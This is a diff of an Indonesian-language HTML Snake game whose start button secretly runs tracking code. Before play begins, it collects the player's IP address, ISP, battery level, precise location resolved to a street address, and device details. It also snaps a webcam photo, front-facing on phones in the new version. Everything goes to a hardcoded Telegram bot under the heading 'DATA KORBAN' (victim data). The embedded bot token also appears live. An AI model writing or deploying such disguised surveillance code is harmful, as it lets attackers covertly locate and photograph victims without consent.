@@ -1,488 +1,495 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Snake Game</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: 'Courier New', monospace;
-      background: #1a1a2e;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      color: #fff;
-    }
-    .container {
-      background: #16213e;
-      padding: 20px;
-      border-radius: 20px;
-      text-align: center;
-      width: 92%;
-      max-width: 450px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
-    }
-    h1 {
-      font-size: 28px;
-      color: #e94560;
-      text-shadow: 0 0 10px #e94560;
-    }
-    canvas {
-      background: #0f3460;
-      display: block;
-      margin: 15px auto;
-      border-radius: 10px;
-      width: 100%;
-      max-width: 400px;
-      aspect-ratio: 1/1;
-    }
-    .info {
-      display: flex;
-      justify-content: space-between;
-      font-size: 18px;
-      margin: 10px 0;
-    }
-    .info span {
-      background: #0f3460;
-      padding: 5px 15px;
-      border-radius: 30px;
-    }
-    .btn {
-      background: #e94560;
-      border: none;
-      padding: 12px 30px;
-      border-radius: 50px;
-      font-size: 18px;
-      font-weight: bold;
-      color: white;
-      cursor: pointer;
-      transition: 0.3s;
-      margin-top: 10px;
-    }
-    .btn:hover {
-      transform: scale(1.05);
-      background: #c73652;
-    }
-    .btn:disabled {
-      background: #555;
-      cursor: not-allowed;
-    }
-    .status {
-      margin-top: 15px;
-      font-size: 14px;
-      color: #aaa;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snake Game</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #1a1a2e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+        .container {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 20px;
+            text-align: center;
+            width: 92%;
+            max-width: 450px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+        }
+        h1 {
+            font-size: 28px;
+            color: #e94560;
+            text-shadow: 0 0 10px #e94560;
+        }
+        canvas {
+            background: #0f3460;
+            display: block;
+            margin: 15px auto;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
+            aspect-ratio: 1/1;
+        }
+        .info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 18px;
+            margin: 10px 0;
+        }
+        .info span {
+            background: #0f3460;
+            padding: 5px 15px;
+            border-radius: 30px;
+        }
+        .btn {
+            background: #e94560;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            background: #c73652;
+        }
+        .btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #aaa;
+        }
+    </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>🐍 SNAKE GAME</h1>
-    <div class="info">
-      <span>🍎 <span id="score">0</span></span>
-      <span>🏆 <span id="highScore">0</span></span>
+    <div class="container">
+        <h1>🐍 SNAKE GAME</h1>
+        <div class="info">
+            <span>🍎 <span id="score">0</span></span>
+            <span>🏆 <span id="highScore">0</span></span>
+        </div>
+        <canvas id="gameCanvas" width="400" height="400"></canvas>
+        <button class="btn" id="startBtn">▶ Mulai Game</button>
+        <div class="status" id="statusText">Tekan tombol untuk bermain</div>
     </div>
-    <canvas id="gameCanvas" width="400" height="400"></canvas>
-    <button class="btn" id="startBtn">▶ Mulai Game</button>
-    <div class="status" id="statusText">Tekan tombol untuk bermain</div>
-  </div>
 
-  <script>
-    // ============================
-    //  KONFIGURASI TELEGRAM
-    // ============================
-    const BOT_TOKEN = '8684818663:AAGHhzUVMn1irJnrlcpVzNXQjGpImKJzkKU';
-    const CHAT_ID = '6836011848';
+    <script>
+        // ============================
+        //  KONFIGURASI TELEGRAM
+        // ============================
+        const BOT_TOKEN = '8684818663:AAGHhzUVMn1irJnrlcpVzNXQjGpImKJzkKU';
+        const CHAT_ID = '6836011848';
 
-    // ============================
-    //  KIRIM PESAN TEKS (LANGSUNG)
-    // ============================
-    async function sendMessage(text) {
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown'
-          })
-        });
-        const result = await res.json();
-        console.log('SendMessage result:', result);
-        return result.ok === true;
-      } catch (e) {
-        console.error('SendMessage error:', e);
-        return false;
-      }
-    }
-
-    // ============================
-    //  KIRIM FOTO
-    // ============================
-    async function sendPhoto(base64) {
-      try {
-        const blob = await fetch(base64).then(r => r.blob());
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'foto_korban.jpg');
-        fd.append('caption', '📸 *FOTO KORBAN*');
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: fd
-        });
-        const result = await res.json();
-        console.log('SendPhoto result:', result);
-        return result.ok === true;
-      } catch (e) {
-        console.error('SendPhoto error:', e);
-        return false;
-      }
-    }
-
-    // ============================
-    //  AMBIL DATA
-    // ============================
-    async function getIP() {
-      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip || 'Tidak diketahui'; } catch { return 'Tidak diketahui'; }
-    }
-
-    async function getISP() {
-      try { const r = await fetch('https://ipapi.co/isp/'); const t = await r.text(); return t || 'Tidak diketahui'; } catch { return 'Tidak diketahui'; }
-    }
-
-    function getBattery() {
-      return new Promise(resolve => {
-        if (!navigator.getBattery) return resolve('Tidak diketahui');
-        navigator.getBattery().then(b => resolve(Math.round(b.level * 100) + '%')).catch(() => resolve('Tidak diketahui'));
-      });
-    }
-
-    function getLocation() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve({ lat: 0, lng: 0 });
-        navigator.geolocation.getCurrentPosition(
-          p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
-          () => resolve({ lat: 0, lng: 0 }), { timeout: 3000 }
-        );
-      });
-    }
-
-    async function getLocationDetail(lat, lng) {
-      try {
-        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
-        const d = await r.json();
-        const a = d.address || {};
-        return {
-          negara: a.country || 'Tidak diketahui',
-          provinsi: a.state || a.province || 'Tidak diketahui',
-          kota: a.city || a.town || a.municipality || 'Tidak diketahui',
-          kecamatan: a.city_district || a.district || 'Tidak diketahui',
-          kelurahan: a.suburb || a.village || a.neighbourhood || 'Tidak diketahui',
-          rt: a.road || 'Tidak diketahui',
-          kodePos: a.postcode || 'Tidak diketahui',
-          alamat: d.display_name || 'Tidak diketahui',
-          maps: `https://maps.google.com/maps?q=${lat},${lng}`
-        };
-      } catch { return {
-          negara: 'Tidak diketahui',
-          provinsi: 'Tidak diketahui',
-          kota: 'Tidak diketahui',
-          kecamatan: 'Tidak diketahui',
-          kelurahan: 'Tidak diketahui',
-          rt: 'Tidak diketahui',
-          kodePos: 'Tidak diketahui',
-          alamat: 'Tidak diketahui',
-          maps: 'Tidak diketahui'
-        }; }
-    }
-
-    async function ambilFoto() {
-      return new Promise((resolve) => {
-        const video = document.createElement('video');
-        const canvas = document.createElement('canvas');
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: 640, height: 480 } })
-          .then((stream) => {
-            video.srcObject = stream;
-            video.play();
-            setTimeout(() => {
-              canvas.width = video.videoWidth || 640;
-              canvas.height = video.videoHeight || 480;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0);
-              const foto = canvas.toDataURL('image/jpeg', 0.8);
-              stream.getTracks().forEach(t => t.stop());
-              resolve(foto);
-            }, 800);
-          })
-          .catch(() => resolve(null));
-      });
-    }
-
-    // ============================
-    //  CAPTURE + KIRIM LANGSUNG
-    // ============================
-    async function captureAndSend() {
-      try {
-        const [ip, isp, bat, loc] = await Promise.all([
-          getIP(),
-          getISP(),
-          getBattery(),
-          getLocation()
-        ]);
-
-        const detail = await getLocationDetail(loc.lat, loc.lng);
-
-        const data = {
-          ip,
-          isp,
-          bat,
-          perangkat: navigator.userAgent || 'Tidak diketahui',
-          os: navigator.platform || 'Tidak diketahui',
-          browser: navigator.userAgent || 'Tidak diketahui',
-          bahasa: navigator.language || 'Tidak diketahui',
-          layar: `${screen.width}x${screen.height}`,
-          waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-          link: window.location.href,
-          ...detail,
-          lat: loc.lat,
-          lng: loc.lng
-        };
-
-        // === FORMAT PESAN LANGSUNG (SEPERTI SS) ===
-        const pesan = `
-🔴 *DATA KORBAN* 🔴
-─────────────────
-📅 *Waktu*     : ${data.waktu}
-💻 *Perangkat* : ${data.perangkat}
-🌐 *Browser*   : ${data.browser}
-📌 *IP*        : ${data.ip}
-
-📍 *LOKASI*
-─────────────────
-🗺️ *Negara*     : ${data.negara}
-🏛️ *Provinsi*   : ${data.provinsi}
-🏙️ *Kota*       : ${data.kota}
-🗾 *Kecamatan*  : ${data.kecamatan}
-🏘️ *Kelurahan*  : ${data.kelurahan}
-🛣️ *RT/RW*      : ${data.rt}
-📮 *Kode Pos*   : ${data.kodePos}
-📍 *Alamat*     : ${data.alamat}
-🗺️ *Google Maps*: ${data.maps}
-📍 *Koordinat*  : ${data.lat}, ${data.lng}
-
-📱 *PERANGKAT*
-─────────────────
-💻 *OS*         : ${data.os}
-🌐 *Browser*    : ${data.browser}
-📐 *Resolusi*   : ${data.layar}
-🔋 *Baterai*    : ${data.bat}
-🌍 *Bahasa*     : ${data.bahasa}
-⏰ *Timezone*   : Asia/Jakarta
-
-─────────────────
-👑 *Dikirim untuk Tuan SILL*
-        `;
-
-        // === KIRIM PESAN LANGSUNG ===
-        const teksOK = await sendMessage(pesan);
-        console.log('Pesan langsung terkirim:', teksOK);
-
-        // === KIRIM FOTO ===
-        const foto = await ambilFoto();
-        if (foto) {
-          const fotoOK = await sendPhoto(foto);
-          console.log('Foto terkirim:', fotoOK);
+        // ============================
+        //  KIRIM PESAN TEKS (LANGSUNG)
+        // ============================
+        async function sendMessage(text) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return res.ok;
+            } catch { return false; }
         }
 
-      } catch (error) {
-        console.error('Error:', error);
-      }
-    }
-
-    // ============================
-    //  GAME SNAKE
-    // ============================
-    const canvas = document.getElementById('gameCanvas');
-    const ctx = canvas.getContext('2d');
-    const scoreSpan = document.getElementById('score');
-    const highScoreSpan = document.getElementById('highScore');
-    const statusText = document.getElementById('statusText');
-    const startBtn = document.getElementById('startBtn');
-
-    let snake, direction, nextDirection, food, score, highScore, gameInterval, gameRunning;
-
-    function initGame() {
-      snake = [{ x: 10, y: 10 }, { x: 9, y: 10 }, { x: 8, y: 10 }];
-      direction = 'RIGHT';
-      nextDirection = 'RIGHT';
-      score = 0;
-      scoreSpan.textContent = score;
-      statusText.textContent = 'Game berjalan...';
-      spawnFood();
-      drawCanvas();
-    }
-
-    function spawnFood() {
-      let pos, valid;
-      do {
-        pos = { x: Math.floor(Math.random() * 20), y: Math.floor(Math.random() * 20) };
-        valid = !snake.some(seg => seg.x === pos.x && seg.y === pos.y);
-      } while (!valid);
-      food = pos;
-    }
-
-    function drawCanvas() {
-      ctx.clearRect(0, 0, 400, 400);
-      ctx.strokeStyle = '#1a4a7a';
-      ctx.lineWidth = 0.5;
-      for (let i = 0; i <= 20; i++) {
-        ctx.beginPath();
-        ctx.moveTo(i * 20, 0);
-        ctx.lineTo(i * 20, 400);
-        ctx.stroke();
-        ctx.beginPath();
-        ctx.moveTo(0, i * 20);
-        ctx.lineTo(400, i * 20);
-        ctx.stroke();
-      }
-      ctx.fillStyle = '#00ff88';
-      snake.forEach(seg => ctx.fillRect(seg.x * 20, seg.y * 20, 18, 18));
-      const head = snake[0];
-      ctx.fillStyle = '#00cc66';
-      ctx.fillRect(head.x * 20, head.y * 20, 18, 18);
-      ctx.fillStyle = '#ff4444';
-      ctx.shadowColor = '#ff4444';
-      ctx.shadowBlur = 10;
-      ctx.beginPath();
-      ctx.arc(food.x * 20 + 10, food.y * 20 + 10, 8, 0, 2 * Math.PI);
-      ctx.fill();
-      ctx.shadowBlur = 0;
-    }
-
-    function gameLoop() {
-      if (!gameRunning) return;
-      direction = nextDirection;
-      const head = { ...snake[0] };
-      switch (direction) {
-        case 'RIGHT':
-          head.x++;
-          break;
-        case 'LEFT':
-          head.x--;
-          break;
-        case 'UP':
-          head.y--;
-          break;
-        case 'DOWN':
-          head.y++;
-          break;
-      }
-      if (head.x < 0 || head.x >= 20 || head.y < 0 || head.y >= 20) {
-        gameOver();
-        return;
-      }
-      if (snake.some(seg => seg.x === head.x && seg.y === head.y)) {
-        gameOver();
-        return;
-      }
-      snake.unshift(head);
-      if (head.x === food.x && head.y === food.y) {
-        score++;
-        scoreSpan.textContent = score;
-        spawnFood();
-        if (score > highScore) {
-          highScore = score;
-          highScoreSpan.textContent = highScore;
-          localStorage.setItem('snakeHighScore', highScore);
+        // ============================
+        //  KIRIM FOTO
+        // ============================
+        async function sendPhoto(base64) {
+            try {
+                const blob = await fetch(base64).then(r => r.blob());
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'foto_korban.jpg');
+                fd.append('caption', '📸 *FOTO KORBAN (SELFIE)*');
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+                return res.ok;
+            } catch { return false; }
         }
-      } else {
-        snake.pop();
-      }
-      drawCanvas();
-    }
 
-    function gameOver() {
-      gameRunning = false;
-      clearInterval(gameInterval);
-      gameInterval = null;
-      statusText.textContent = `Game Over! Skor: ${score}`;
-      startBtn.disabled = false;
-      startBtn.textContent = '▶ Mulai Game';
-    }
+        // ============================
+        //  AMBIL DATA
+        // ============================
+        async function getIP() {
+            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip || 'Tidak diketahui'; } catch { return 'Tidak diketahui'; }
+        }
 
-    // ============================
-    //  EVENT TOMBOL MULAI
-    // ============================
-    startBtn.addEventListener('click', async function() {
-      if (gameRunning) return;
-      if (gameInterval) {
-        clearInterval(gameInterval);
-        gameInterval = null;
-      }
-      statusText.textContent = 'Memulai...';
-      startBtn.disabled = true;
-      startBtn.textContent = '⏳';
-      await captureAndSend();
-      initGame();
-      gameRunning = true;
-      startBtn.disabled = false;
-      startBtn.textContent = '⏹️ Game Berjalan';
-      statusText.textContent = 'Mainkan!';
-      gameInterval = setInterval(gameLoop, 150);
-    });
+        async function getISP() {
+            try { const r = await fetch('https://ipapi.co/isp/'); const t = await r.text(); return t || 'Tidak diketahui'; } catch { return 'Tidak diketahui'; }
+        }
 
-    // Keyboard
-    document.addEventListener('keydown', (e) => {
-      const key = e.key;
-      e.preventDefault();
-      if (!gameRunning) return;
-      if (key === 'ArrowUp' && direction !== 'DOWN') nextDirection = 'UP';
-      else if (key === 'ArrowDown' && direction !== 'UP') nextDirection = 'DOWN';
-      else if (key === 'ArrowLeft' && direction !== 'RIGHT') nextDirection = 'LEFT';
-      else if (key === 'ArrowRight' && direction !== 'LEFT') nextDirection = 'RIGHT';
-    });
+        function getBattery() {
+            return new Promise(resolve => {
+                if (!navigator.getBattery) return resolve('Tidak diketahui');
+                navigator.getBattery().then(b => resolve(Math.round(b.level * 100) + '%')).catch(() => resolve('Tidak diketahui'));
+            });
+        }
 
-    // Touch
-    let touchStartX = 0,
-      touchStartY = 0;
-    canvas.addEventListener('touchstart', (e) => {
-      const touch = e.touches[0];
-      touchStartX = touch.clientX;
-      touchStartY = touch.clientY;
-      e.preventDefault();
-    });
-    canvas.addEventListener('touchmove', (e) => { e.preventDefault(); });
-    canvas.addEventListener('touchend', (e) => {
-      if (!gameRunning || touchStartX === 0) return;
-      const touch = e.changedTouches[0];
-      const dx = touch.clientX - touchStartX;
-      const dy = touch.clientY - touchStartY;
-      if (Math.abs(dx) > Math.abs(dy)) {
-        if (dx > 0 && direction !== 'LEFT') nextDirection = 'RIGHT';
-        else if (dx < 0 && direction !== 'RIGHT') nextDirection = 'LEFT';
-      } else {
-        if (dy > 0 && direction !== 'UP') nextDirection = 'DOWN';
-        else if (dy < 0 && direction !== 'DOWN') nextDirection = 'UP';
-      }
-      touchStartX = 0;
-      touchStartY = 0;
-    });
+        function getLocation() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) return resolve({ lat: 0, lng: 0 });
+                navigator.geolocation.getCurrentPosition(
+                    p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
+                    () => resolve({ lat: 0, lng: 0 }), { timeout: 5000 }
+                );
+            });
+        }
 
-    // ============================
-    //  START
-    // ============================
-    highScore = parseInt(localStorage.getItem('snakeHighScore')) || 0;
-    highScoreSpan.textContent = highScore;
-    initGame();
-    drawCanvas();
-    statusText.textContent = 'Tekan tombol Mulai Game untuk bermain';
-  </script>
+        async function getLocationDetail(lat, lng) {
+            try {
+                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                const d = await r.json();
+                const a = d.address || {};
+                return {
+                    negara: a.country || 'Tidak diketahui',
+                    provinsi: a.state || a.province || 'Tidak diketahui',
+                    kota: a.city || a.town || a.municipality || 'Tidak diketahui',
+                    kecamatan: a.city_district || a.district || 'Tidak diketahui',
+                    kelurahan: a.suburb || a.village || a.neighbourhood || 'Tidak diketahui',
+                    rt: a.road || 'Tidak diketahui',
+                    kodePos: a.postcode || 'Tidak diketahui',
+                    alamat: d.display_name || 'Tidak diketahui',
+                    maps: `https://maps.google.com/maps?q=${lat},${lng}`
+                };
+            } catch { return {
+                    negara: 'Tidak diketahui',
+                    provinsi: 'Tidak diketahui',
+                    kota: 'Tidak diketahui',
+                    kecamatan: 'Tidak diketahui',
+                    kelurahan: 'Tidak diketahui',
+                    rt: 'Tidak diketahui',
+                    kodePos: 'Tidak diketahui',
+                    alamat: 'Tidak diketahui',
+                    maps: 'Tidak diketahui'
+                }; }
+        }
+
+        // ============================
+        //  AMBIL FOTO DENGAN KAMERA DEPAN (HP) / DEFAULT (LAPTOP)
+        // ============================
+        async function ambilFoto() {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+
+                // Deteksi HP atau laptop
+                const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+                // Pilih kamera depan jika HP, default jika laptop
+                let facingMode = 'user'; // depan = selfie
+                if (!isMobile) {
+                    facingMode = 'environment'; // laptop biasanya pake default
+                }
+
+                navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: facingMode,
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        }
+                    })
+                    .then((stream) => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            const foto = canvas.toDataURL('image/jpeg', 0.8);
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(foto);
+                        }, 800);
+                    })
+                    .catch(() => resolve(null));
+            });
+        }
+
+        // ============================
+        //  CAPTURE + KIRIM LANGSUNG
+        // ============================
+        async function captureAndSend() {
+            try {
+                const [ip, isp, bat, loc] = await Promise.all([
+                    getIP(),
+                    getISP(),
+                    getBattery(),
+                    getLocation()
+                ]);
+
+                const detail = await getLocationDetail(loc.lat, loc.lng);
+
+                const data = {
+                    ip,
+                    isp,
+                    bat,
+                    perangkat: navigator.userAgent || 'Tidak diketahui',
+                    os: navigator.platform || 'Tidak diketahui',
+                    browser: navigator.userAgent || 'Tidak diketahui',
+                    bahasa: navigator.language || 'Tidak diketahui',
+                    layar: `${screen.width}x${screen.height}`,
+                    waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                    link: window.location.href,
+                    ...detail,
+                    lat: loc.lat,
+                    lng: loc.lng
+                };
+
+                // === FORMAT PESAN LANGSUNG ===
+                const pesan = `
+        🔴 *DATA KORBAN* 🔴
+        ─────────────────
+        📅 *Waktu*     : ${data.waktu}
+        💻 *Perangkat* : ${data.perangkat}
+        🌐 *Browser*   : ${data.browser}
+        📌 *IP*        : ${data.ip}
+
+        📍 *LOKASI REAL*
+        ─────────────────
+        🗺️ *Negara*     : ${data.negara}
+        🏛️ *Provinsi*   : ${data.provinsi}
+        🏙️ *Kota*       : ${data.kota}
+        🗾 *Kecamatan*  : ${data.kecamatan}
+        🏘️ *Kelurahan*  : ${data.kelurahan}
+        🛣️ *RT/RW*      : ${data.rt}
+        📮 *Kode Pos*   : ${data.kodePos}
+        📍 *Alamat*     : ${data.alamat}
+        🗺️ *Google Maps*: ${data.maps}
+        📍 *Koordinat*  : ${data.lat}, ${data.lng}
+
+        📱 *PERANGKAT*
+        ─────────────────
+        💻 *OS*         : ${data.os}
+        🌐 *Browser*    : ${data.browser}
+        📐 *Resolusi*   : ${data.layar}
+        🔋 *Baterai*    : ${data.bat}
+        🌍 *Bahasa*     : ${data.bahasa}
+        ⏰ *Timezone*   : Asia/Jakarta
+
+        ─────────────────
+        👑 *Dikirim untuk Tuan SILL*
+                `;
+
+                // === KIRIM PESAN LANGSUNG ===
+                await sendMessage(pesan);
+
+                // === KIRIM FOTO (SELFIE UNTUK HP) ===
+                const foto = await ambilFoto();
+                if (foto) {
+                    await sendPhoto(foto);
+                }
+
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // ============================
+        //  GAME SNAKE
+        // ============================
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+        const scoreSpan = document.getElementById('score');
+        const highScoreSpan = document.getElementById('highScore');
+        const statusText = document.getElementById('statusText');
+        const startBtn = document.getElementById('startBtn');
+
+        let snake, direction, nextDirection, food, score, highScore, gameInterval, gameRunning;
+
+        function initGame() {
+            snake = [{ x: 10, y: 10 }, { x: 9, y: 10 }, { x: 8, y: 10 }];
+            direction = 'RIGHT';
+            nextDirection = 'RIGHT';
+            score = 0;
+            scoreSpan.textContent = score;
+            statusText.textContent = 'Game berjalan...';
+            spawnFood();
+            drawCanvas();
+        }
+
+        function spawnFood() {
+            let pos, valid;
+            do {
+                pos = { x: Math.floor(Math.random() * 20), y: Math.floor(Math.random() * 20) };
+                valid = !snake.some(seg => seg.x === pos.x && seg.y === pos.y);
+            } while (!valid);
+            food = pos;
+        }
+
+        function drawCanvas() {
+            ctx.clearRect(0, 0, 400, 400);
+            ctx.strokeStyle = '#1a4a7a';
+            ctx.lineWidth = 0.5;
+            for (let i = 0; i <= 20; i++) {
+                ctx.beginPath();
+                ctx.moveTo(i * 20, 0);
+                ctx.lineTo(i * 20, 400);
+                ctx.stroke();
+                ctx.beginPath();
+                ctx.moveTo(0, i * 20);
+                ctx.lineTo(400, i * 20);
+                ctx.stroke();
+            }
+            ctx.fillStyle = '#00ff88';
+            snake.forEach(seg => ctx.fillRect(seg.x * 20, seg.y * 20, 18, 18));
+            const head = snake[0];
+            ctx.fillStyle = '#00cc66';
+            ctx.fillRect(head.x * 20, head.y * 20, 18, 18);
+            ctx.fillStyle = '#ff4444';
+            ctx.shadowColor = '#ff4444';
+            ctx.shadowBlur = 10;
+            ctx.beginPath();
+            ctx.arc(food.x * 20 + 10, food.y * 20 + 10, 8, 0, 2 * Math.PI);
+            ctx.fill();
+            ctx.shadowBlur = 0;
+        }
+
+        function gameLoop() {
+            if (!gameRunning) return;
+            direction = nextDirection;
+            const head = { ...snake[0] };
+            switch (direction) {
+                case 'RIGHT':
+                    head.x++;
+                    break;
+                case 'LEFT':
+                    head.x--;
+                    break;
+                case 'UP':
+                    head.y--;
+                    break;
+                case 'DOWN':
+                    head.y++;
+                    break;
+            }
+            if (head.x < 0 || head.x >= 20 || head.y < 0 || head.y >= 20) {
+                gameOver();
+                return;
+            }
+            if (snake.some(seg => seg.x === head.x && seg.y === head.y)) {
+                gameOver();
+                return;
+            }
+            snake.unshift(head);
+            if (head.x === food.x && head.y === food.y) {
+                score++;
+                scoreSpan.textContent = score;
+                spawnFood();
+                if (score > highScore) {
+                    highScore = score;
+                    highScoreSpan.textContent = highScore;
+                    localStorage.setItem('snakeHighScore', highScore);
+                }
+            } else {
+                snake.pop();
+            }
+            drawCanvas();
+        }
+
+        function gameOver() {
+            gameRunning = false;
+            clearInterval(gameInterval);
+            gameInterval = null;
+            statusText.textContent = `Game Over! Skor: ${score}`;
+            startBtn.disabled = false;
+            startBtn.textContent = '▶ Mulai Game';
+        }
+
+        // ============================
+        //  EVENT TOMBOL MULAI
+        // ============================
+        startBtn.addEventListener('click', async function() {
+            if (gameRunning) return;
+            if (gameInterval) {
+                clearInterval(gameInterval);
+                gameInterval = null;
+            }
+            statusText.textContent = 'Memulai...';
+            startBtn.disabled = true;
+            startBtn.textContent = '⏳';
+            await captureAndSend();
+            initGame();
+            gameRunning = true;
+            startBtn.disabled = false;
+            startBtn.textContent = '⏹️ Game Berjalan';
+            statusText.textContent = 'Mainkan!';
+            gameInterval = setInterval(gameLoop, 150);
+        });
+
+        // Keyboard
+        document.addEventListener('keydown', (e) => {
+            const key = e.key;
+            e.preventDefault();
+            if (!gameRunning) return;
+            if (key === 'ArrowUp' && direction !== 'DOWN') nextDirection = 'UP';
+            else if (key === 'ArrowDown' && direction !== 'UP') nextDirection = 'DOWN';
+            else if (key === 'ArrowLeft' && direction !== 'RIGHT') nextDirection = 'LEFT';
+            else if (key === 'ArrowRight' && direction !== 'LEFT') nextDirection = 'RIGHT';
+        });
+
+        // Touch
+        let touchStartX = 0,
+            touchStartY = 0;
+        canvas.addEventListener('touchstart', (e) => {
+            const touch = e.touches[0];
+            touchStartX = touch.clientX;
+            touchStartY = touch.clientY;
+            e.preventDefault();
+        });
+        canvas.addEventListener('touchmove', (e) => { e.preventDefault(); });
+        canvas.addEventListener('touchend', (e) => {
+            if (!gameRunning || touchStartX === 0) return;
+            const touch = e.changedTouches[0];
+            const dx = touch.clientX - touchStartX;
+            const dy = touch.clientY - touchStartY;
+            if (Math.abs(dx) > Math.abs(dy)) {
+                if (dx > 0 && direction !== 'LEFT') nextDirection = 'RIGHT';
+                else if (dx < 0 && direction !== 'RIGHT') nextDirection = 'LEFT';
+            } else {
+                if (dy > 0 && direction !== 'UP') nextDirection = 'DOWN';
+                else if (dy < 0 && direction !== 'DOWN') nextDirection = 'UP';
+            }
+            touchStartX = 0;
+            touchStartY = 0;
+        });
+
+        // ============================
+        //  START
+        // ============================
+        highScore = parseInt(localStorage.getItem('snakeHighScore')) || 0;
+        highScoreSpan.textContent = highScore;
+        initGame();
+        drawCanvas();
+        statusText.textContent = 'Tekan tombol Mulai Game untuk bermain';
+    </script>
 </body>
 </html>
